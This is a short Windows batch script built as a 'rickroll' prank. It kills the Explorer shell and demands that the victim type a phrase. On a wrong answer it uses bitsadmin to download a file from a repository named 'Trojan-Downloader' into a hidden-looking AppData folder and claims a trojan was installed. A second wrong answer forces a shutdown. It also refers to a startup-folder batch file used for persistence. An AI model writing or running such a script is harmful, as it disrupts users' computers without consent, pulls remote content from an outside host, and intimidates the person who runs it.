@echo off
chcp 65001>nul 2>&1  
title ·  ⋅  . ⋅  ∙ ॱˑ∙⸳‧·
taskkill /f /im explorer.exe

set /p input=Admit you were rickrolled (type "im rickrolled") :
echo %input% | findstr /i "Im rickrolled" >nul
if %errorlevel% == 0 (
  echo .
  echo Glory to RICK ASTLEY
  ping -n 3 127.0.0.1 >nul 2>&1
  echo It was my pleasure to meet someone can solve this.
  ping -n 3 127.0.0.1 >nul 2>&1
  echo Pranks deleted. Bye!
  ping -n 3 127.0.0.1 >nul 2>&1
  del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat" && rmdir /s /q "%appdata%\Microsoft\Update"
  taskkill /fi "WINDOWTITLE eq ·  ⋅  . ⋅  ∙ ॱˑ∙⸳‧·" /f >nul 2>&1
) else (
  echo .
  echo You have ONE chance left. 
  ping -n 3 127.0.0.1 >nul 2>&1
  goto chance
  )

:chance
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/Alexuiop1337/Trojan-Downloader/master/App.config" "%AppData%\Microsoft\Update\gibberish"
echo .
echo ================
echo Trojan.exe downloaded successfully.
echo ================
echo Be wise.
echo It is your last chance.
echo ================
set /p input=Type "im rickrolled":

echo %input% | findstr /i "Im rickrolled" >nul

if %errorlevel% == 0 (
  echo .
  echo Glory to RICK ASTLEY
  ping -n 3 127.0.0.1 >nul 2>&1
  echo Pranks deleted. Bye!
  ping -n 3 127.0.0.1 >nul 2>&1
  del /f /q %appdata%\trojan.exe &&　del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat" && rmdir /s /q "%appdata%\Microsoft\Update"
  taskkill /fi "WINDOWTITLE eq ·  ⋅  . ⋅  ∙ ॱˑ∙⸳‧·" /f >nul 2>&1
) else (
  echo .
  echo Meh. Your choice. Be wise next time.
  ping -n 3 127.0.0.1 >nul 2>&1
  echo Enjoy your NEXT rickroll, bye!
  ping -n 3 127.0.0.1 >nul 2>&1
  shutdown /f /s /t 3
  )
